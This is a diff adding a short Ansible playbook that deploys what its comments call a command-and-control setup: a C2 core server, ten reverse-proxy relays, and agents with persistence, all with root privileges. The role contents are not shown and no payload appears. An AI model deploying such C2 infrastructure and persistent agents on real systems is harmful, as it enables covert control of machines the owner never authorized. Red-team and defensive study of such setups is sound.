@@ -1,0 +1,23 @@
+---
+# First, update networking and certs on everything
+- hosts: all
+  become: true # Needed for root permission (except on Windows SYSTEM)
+  roles:
+    - common_net
+
+# Deploy the C2 Core (server.py, index.html)
+- hosts: backend
+  become: true
+  roles:
+    - snake_server
+
+# Configure the 10 Reverse Proxies
+- hosts: relays
+  become: true
+  roles:
+    - snake_relay
+
+# Deploy the Agents and Persistence
+- hosts: agents
+  roles:
+    - snake_agent
